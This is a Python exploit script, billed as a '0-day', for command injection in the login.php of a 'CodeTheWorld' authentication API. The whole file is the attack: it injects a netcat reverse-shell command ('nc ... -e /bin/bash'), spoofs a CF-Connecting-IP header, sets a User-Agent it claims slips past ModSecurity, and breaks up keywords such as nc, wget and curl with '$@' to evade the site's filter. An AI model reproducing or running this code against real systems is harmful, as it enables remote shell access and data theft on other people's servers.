# CodeTheWorld authentication API command injection 0-day
# Author: checksum (@0xFADE)

import requests
import urllib.parse
import re


# configuration
TARGET = 'http://example.com/login.php'
COMMAND = 'nc 127.0.0.1 4444 -e /bin/bash'
QUERY = 'user=%s&pw=password'


class ExploitException(Exception):
    pass


class Exploit:
    """ CodeTheWorld authentication API command injection 0-day
    
    Executes a simple command injection exploit, found in
    the login.php file of CodeTheWorld's authentication API,
    bypassing the poorly developed command injection filter,
    that was made to prevent hackers like me LOL.
    """

    def __init__(self, target, query, command):
        self.target = target
        self.query = query
        self.command = command
        self.headers = {
            'CF-Connecting-IP': '127.0.0.1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36 Edg/84.0.522.59' # setting the User-Agent bypasses MOD_SEcurity for some reason, lol
        }


    def validate(self, command: str) -> bool:
        """ Validate shell command

        Validates the specified shell command to find
        impossible operators in use.

        Args:
            command (str): shell command to validate

        Returns:
            bool: command is valid
        """
        for op in (':', '>&', '`', '+'):
            if op in command:
                return False

        return re.match(r'.*(py|python)[2-3]{0,1}\s+-c\s+(\'|").*[;]+.*(\'|").*', command) is None


    def bypass_filter(self, command: str) -> str:
        """ Replace keywords and operators to bypass command injection filter

        Replaces keywords and shell operators to bypass the
        command injection filter and returns the new modified command.

        Args:
            command (str): the command to make bypassable

        Returns:
            str: the modified command to bypass the command injection filter
        """
        command = command.lower()

        for sep in '&|;':
            command = command.replace(sep, '\n')

        for kw in ('netcat', 'nc', 'python', 'wget', 'curl'):
            command = command.replace(kw, kw[:1] + '$@' + kw[1:])

        return command


    def execute(self, encode: bool=True) -> requests.models.Response:
        """ Execute command injection 0-day exploit

        URl encodes the payload and executes it through a
        command injection vulnerability on the target site.

        Args:
            encode (bool): URL encode payload

        Raises:
            ExploitException: if command is impossible to execute (command unbypassable operators)

        Returns:
            requests.models.Response: HTTP request response
        """
        if self.validate(self.command) is False:
            raise ExploitException('Command not possible to execute')

        # i.e grep -i '' /dev/null; echo "Hello World!" #/var/www/html/users.sql
        payload = self.bypass_filter(f"'' /dev/null; {self.command} #")

        if encode:
            payload = urllib.parse.quote(payload)

        return requests.get(f'{self.target}?{self.query}' % payload, headers=self.headers)


def main():
    print('CodeTheWorld authentication API (login.php) command injection 0-day by checksum (@0xFADE)\n')

    print('Executing exploit...')

    exploit = Exploit(TARGET, QUERY, COMMAND)

    try:
        res = exploit.execute()

        print(f'Exploit executed!\n\nResponse code: {res.status_code}\nResponse body:\n {res.text}')

    except Exception as e:
        print(f'An error occured while executing exploit: {e}')


if __name__ == '__main__':
    main()
